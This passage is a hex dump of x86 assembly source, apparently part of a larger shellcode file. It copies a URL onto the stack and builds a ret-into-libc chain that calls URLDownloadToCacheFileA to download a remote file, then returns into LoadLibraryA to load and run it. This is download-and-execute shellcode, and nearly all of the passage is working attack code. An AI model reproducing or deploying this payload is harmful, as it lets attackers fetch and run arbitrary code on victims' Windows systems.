00001260  63 6b 20 61 6e 64 20 4e  55 4c 4c 20 74 65 72 6d  |ck and NULL term|
00001270  69 6e 61 74 65 20 69 74  3a 0d 0a 20 20 20 20 4d  |inate it:..    M|
00001280  4f 56 20 20 20 20 20 45  44 49 2c 20 45 53 50 20  |OV     EDI, ESP |
00001290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000012a0  20 20 20 3b 20 45 44 49  20 3d 20 26 28 62 75 66  |   ; EDI = &(buf|
000012b0  66 65 72 29 0d 0a 20 20  20 20 50 55 53 48 20 20  |fer)..    PUSH  |
000012c0  20 20 42 59 54 45 20 73  69 7a 65 6f 66 5f 75 72  |  BYTE sizeof_ur|
000012d0  6c 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |l             ; |
000012e0  0d 0a 20 20 20 20 50 4f  50 20 20 20 20 20 45 43  |..    POP     EC|
000012f0  58 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |X               |
00001300  20 20 20 20 20 20 20 20  20 20 3b 20 45 43 58 20  |          ; ECX |
00001310  3d 20 73 69 7a 65 6f 66  28 75 72 6c 29 0d 0a 20  |= sizeof(url).. |
00001320  20 20 20 52 45 50 20 20  20 20 20 4d 4f 56 53 42  |   REP     MOVSB|
00001330  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001340  20 20 20 20 20 20 20 3b  20 53 74 61 63 6b 20 3d  |       ; Stack =|
00001350  20 75 72 6c 20 62 75 66  66 65 72 20 20 20 20 20  | url buffer     |
00001360  7c 20 45 44 49 20 3d 20  26 28 62 75 66 66 65 72  || EDI = &(buffer|
00001370  29 0d 0a 20 20 20 20 53  54 4f 53 42 20 20 20 20  |)..    STOSB    |
00001380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001390  20 20 20 20 20 20 20 20  20 20 20 3b 20 53 74 61  |           ; Sta|
000013a0  63 6b 20 3d 20 75 72 6c  2c 20 30 2c 20 62 75 66  |ck = url, 0, buf|
000013b0  66 65 72 20 7c 20 45 44  49 20 3d 20 26 28 62 75  |fer | EDI = &(bu|
000013c0  66 66 65 72 29 0d 0a 20  20 20 20 4d 4f 56 20 20  |ffer)..    MOV  |
000013d0  20 20 20 45 53 49 2c 20  45 53 50 20 20 20 20 20  |   ESI, ESP     |
000013e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
000013f0  20 45 53 49 20 3d 20 26  28 75 72 6c 29 0d 0a 20  | ESI = &(url).. |
00001400  20 20 20 3b 20 43 72 65  61 74 65 20 61 20 72 65  |   ; Create a re|
00001410  74 2d 69 6e 74 6f 2d 6c  69 62 63 20 73 74 61 63  |t-into-libc stac|
00001420  6b 20 63 68 61 69 6e 20  74 6f 20 6d 61 6b 65 20  |k chain to make |
00001430  55 52 4c 44 6f 77 6e 6c  6f 61 64 54 6f 43 61 63  |URLDownloadToCac|
00001440  68 65 46 69 6c 65 41 28  29 20 72 65 74 75 72 6e  |heFileA() return|
00001450  20 74 6f 20 4c 6f 61 64  4c 69 62 72 61 72 79 41  | to LoadLibraryA|
00001460  28 29 3a 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |():..           |
00001470  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001480  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 4c  |             ; L|
00001490  6f 61 64 4c 69 62 72 61  72 79 41 28 0d 0a 20 20  |oadLibraryA(..  |
000014a0  20 20 50 55 53 48 20 20  20 20 45 44 49 20 20 20  |  PUSH    EDI   |
000014b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000014c0  20 20 20 20 20 20 3b 20  20 20 5f 5f 69 6e 20 4c  |      ;   __in L|
000014d0  50 43 54 53 54 52 20 6c  70 46 69 6c 65 4e 61 6d  |PCTSTR lpFileNam|
000014e0  65 20 3d 20 26 28 62 75  66 66 65 72 29 0d 0a 20  |e = &(buffer).. |
000014f0  20 20 20 50 55 53 48 20  20 20 20 45 43 58 20 20  |   PUSH    ECX  |
00001500  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001510  20 20 20 20 20 20 20 3b  20 29 20 72 65 74 75 72  |       ; ) retur|
00001520  6e 20 61 64 64 72 65 73  73 20 3d 20 4e 55 4c 4c  |n address = NULL|
00001530  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001540  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001550  20 20 20 20 20 20 20 20  20 20 3b 20 55 52 4c 44  |          ; URLD|
00001560  6f 77 6e 6c 6f 61 64 54  6f 43 61 63 68 65 46 69  |ownloadToCacheFi|
00001570  6c 65 41 28 0d 0a 20 20  20 20 50 55 53 48 20 20  |leA(..    PUSH  |
00001580  20 20 45 43 58 20 20 20  20 20 20 20 20 20 20 20  |  ECX           |
00001590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
000015a0  20 20 5f 5f 69 6e 20 20  49 42 69 6e 64 53 74 61  |  __in  IBindSta|
000015b0  74 75 73 43 61 6c 6c 62  61 63 6b 20 2a 70 42 53  |tusCallback *pBS|
000015c0  43 20 3d 20 4e 55 4c 4c  0d 0a 20 20 20 20 50 55  |C = NULL..    PU|
000015d0  53 48 20 20 20 20 45 43  58 20 20 20 20 20 20 20  |SH    ECX       |
000015e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000015f0  20 20 3b 20 20 20 20 20  20 20 20 20 44 57 4f 52  |  ;         DWOR|
00001600  44 20 64 77 52 65 73 65  72 76 65 64 20 3d 20 4e  |D dwReserved = N|
00001610  55 4c 4c 0d 0a 20 20 20  20 3b 20 4f 75 72 20 62  |ULL..    ; Our b|
00001620  75 66 66 65 72 20 69 73  20 6e 6f 74 20 72 65 61  |uffer is not rea|
00001630  6c 6c 79 20 30 78 31 30  30 20 62 79 74 65 73 20  |lly 0x100 bytes |
00001640  6c 6f 6e 67 20 61 6e 79  6d 6f 72 65 20 62 65 63  |long anymore bec|
00001650  61 75 73 65 20 77 65 20  75 73 65 64 20 70 61 72  |ause we used par|
00001660  74 20 6f 66 20 69 74 20  74 6f 20 73 74 6f 72 65  |t of it to store|
00001670  20 74 68 65 20 55 52 4c  2e 2e 2e 20 6f 68 20 77  | the URL... oh w|
00001680  65 6c 6c 2e 0d 0a 20 20  20 20 50 55 53 48 20 20  |ell...    PUSH  |
00001690  20 20 45 41 58 20 20 20  20 20 20 20 20 20 20 20  |  EAX           |
000016a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
000016b0  20 20 5f 5f 69 6e 20 20  44 57 4f 52 44 20 63 63  |  __in  DWORD cc|
000016c0  68 46 69 6c 65 4e 61 6d  65 20 3d 20 73 69 7a 65  |hFileName = size|
000016d0  6f 66 28 62 75 66 66 65  72 29 0d 0a 20 20 20 20  |of(buffer)..    |
000016e0  50 55 53 48 20 20 20 20  45 44 49 20 20 20 20 20  |PUSH    EDI     |
000016f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001700  20 20 20 20 3b 20 20 20  5f 5f 6f 75 74 20 4c 50  |    ;   __out LP|
00001710  54 53 54 52 20 73 7a 46  69 6c 65 4e 61 6d 65 20  |TSTR szFileName |
00001720  3d 20 26 28 62 75 66 66  65 72 29 0d 0a 20 20 20  |= &(buffer)..   |
00001730  20 50 55 53 48 20 20 20  20 45 53 49 20 20 20 20  | PUSH    ESI    |
00001740  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001750  20 20 20 20 20 3b 20 20  20 5f 5f 69 6e 20 20 4c  |     ;   __in  L|
00001760  50 43 53 54 52 20 73 7a  55 52 4c 20 3d 20 26 28  |PCSTR szURL = &(|
00001770  75 72 6c 29 0d 0a 20 20  20 20 50 55 53 48 20 20  |url)..    PUSH  |
00001780  20 20 45 43 58 20 20 20  20 20 20 20 20 20 20 20  |  ECX           |
00001790  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
000017a0  20 20 5f 5f 69 6e 20 20  4c 50 55 4e 4b 4e 4f 57  |  __in  LPUNKNOW|
000017b0  4e 20 6c 70 55 6e 6b 63  61 6c 6c 65 72 20 3d 20  |N lpUnkcaller = |
000017c0  4e 55 4c 4c 0d 0a 20 20  20 20 50 55 53 48 20 20  |NULL..    PUSH  |
000017d0  20 20 45 44 58 20 20 20  20 20 20 20 20 20 20 20  |  EDX           |
000017e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
000017f0  29 20 72 65 74 75 72 6e  20 61 64 64 72 65 73 73  |) return address|
00001800  20 3d 20 4c 6f 61 64 4c  69 62 72 61 72 79 41 0d  | = LoadLibraryA.|
00001810  0a 20 20 20 20 3b 20 53  74 61 72 74 20 74 68 65  |.    ; Start the|
00001820  20 72 65 74 2d 69 6e 74  6f 2d 6c 69 62 63 20 63  | ret-into-libc c|
00001830  68 61 69 6e 3a 0d 0a 20  20 20 20 4a 4d 50 20 20  |hain:..    JMP  |
00001840  20 20 20 45 42 50 20 20  20 20 20 20 20 20 20 20  |   EBP          |
00001850  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00001860  20 4a 75 6d 70 20 74 6f  20 55 52 4c 44 6f 77 6e  | Jump to URLDown|
00001870  6c 6f 61 64 54 6f 43 61  63 68 65 46 69 6c 65 41  |loadToCacheFileA|
00001880  2c 20 74 68 65 6e 20 72  65 74 75 72 6e 20 74 6f  |, then return to|
00001890  20 4c 6f 61 64 4c 69 62  72 61 72 79 41           | LoadLibraryA|
0000189d
